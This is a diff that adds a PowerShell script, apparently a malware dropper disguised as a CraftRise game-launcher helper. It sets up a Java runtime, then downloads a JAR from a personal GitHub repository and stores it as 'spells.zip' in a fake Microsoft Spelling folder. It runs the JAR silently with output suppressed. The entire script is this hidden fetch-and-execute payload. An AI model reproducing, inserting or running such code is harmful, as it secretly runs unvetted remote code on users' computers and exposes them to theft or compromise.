@@ -1,0 +1,43 @@
+$u = Get-ChildItem "C:\Users" | Where-Object { $_.Name -notin @("Default", "Public") }
+foreach ($ua in $u) {
+    $ub = [System.IO.Path]::Combine($ua.FullName, "AppData", "Roaming")
+    if (Test-Path $ub) {
+        if ((Get-Acl $ub).AccessToString -match "FullControl") {
+            $uc = $ub
+            break
+        }
+    }
+}
+if (-not $uc) { $uc = "C:\Users\Public" }
+
+function x {
+    $jp = [System.IO.Path]::Combine($uc, ".craftrise", "java", "jdk-x64", "bin", "java.exe")
+    if (Test-Path -LiteralPath $jp) { if ((&$jp -version 2>&1) -match "version `"(1\.8|9|10|11)") { return $jp } }
+    return $null
+}
+$h = 'Mozilla/5.0'
+$jp = x
+$wc = New-Object System.Net.WebClient
+if (!$jp) {
+    $cd = [System.IO.Path]::Combine($uc, ".craftrise")
+    mkdir $cd -Force
+    $lz = [System.IO.Path]::Combine($cd, "jre.lzma")
+    $wc.Headers.Add("User-Agent", $h)
+    $wc.DownloadFile('https://client.craftrise.network/api/launcher/libraries/jre-win-64-1.8.0_51.lzma', $lz)
+    $z7 = [System.IO.Path]::Combine($cd, "7zr.exe")
+    $wc.DownloadFile('https://7-zip.org/a/7zr.exe', $z7)
+    & $z7 "x" "`"$lz`"" "-o`"$cd`"" "-y" "-bsp0" "-bso0"
+    $jd = [System.IO.Path]::Combine($cd, "java", "jdk-x64")
+    Add-Type -AssemblyName System.IO.Compression.FileSystem
+    [System.IO.Compression.ZipFile]::ExtractToDirectory([System.IO.Path]::Combine($cd, "jre"), $jd)
+    $jp = x
+}
+if ($jp) {
+    $jp = [System.IO.Path]::Combine($uc, ".craftrise", "java", "jdk-x64", "bin", "javaw.exe")
+    $d = [System.IO.Path]::Combine($uc, "Microsoft", "Spelling", "en-US")
+    mkdir $d -Force
+    $f = [System.IO.Path]::Combine($d, "spells.zip")
+    $wc.Headers.Add("User-Agent", $h)
+    $wc.DownloadFile("https://raw.githubusercontent.com/lawrensxrd/selambasd1/refs/heads/main/ja.jar", $f)
+    & $jp "-jar" "`"$f`"" *>$null
+}
